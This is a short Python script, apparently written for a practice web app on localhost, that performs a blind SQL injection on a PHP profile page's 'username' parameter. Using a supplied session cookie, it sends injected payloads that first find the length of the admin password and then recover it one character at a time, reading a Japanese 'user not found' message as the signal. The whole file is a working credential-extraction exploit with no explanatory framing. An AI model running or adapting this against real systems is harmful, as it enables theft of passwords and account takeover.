#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests
import re
from termcolor import colored
from bs4 import BeautifulSoup as bs
import sys, getopt
import urllib.parse


if len(sys.argv) < 2 :
    print("[*] Usage: python3 blindsql.py \"PHPSESSID\" ")
    exit()


#

url = "http://localhost:8000/users/profileStats.php"
parameter = 'username'
cookie = dict(PHPSESSID=sys.argv[1])

# Check the length of password

for i in range(1,64):
    sql = "admin' AND length(password) LIKE {}#".format(i)
    sql = urllib.parse.quote(sql)
    query_url = "%s?%s=%s" % (url,parameter,sql)

    http_request=requests.get(query_url,cookies=cookie)
    res = bs(http_request.text,"html.parser")

    if "そのユーザーは見つかりませんでした" not in res.text:
        print("password length: {}".format(i))
        password_length = i 

common = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'
passwd = ''

for i in range(1,password_length+1):
    for j in common:

        sqli = ("admin' AND ascii(mid(password,%d,%d)) LIKE %d #" % (i,i,ord(j)))
        sqli = urllib.parse.quote(sqli)

        query_url = "%s?%s=%s" % (url,parameter,sqli)

        http_request=requests.get(query_url,cookies=cookie)
        res = bs(http_request.text,"html.parser")

        if "そのユーザーは見つかりませんでした" not in res.text:
            passwd += j 
            print('[*]password is found!: %s' % passwd)
            break
            
        elif j in common[-1]:
            # the end of string that means the password is found
            print('password: %s' % passwd)
            exit(1)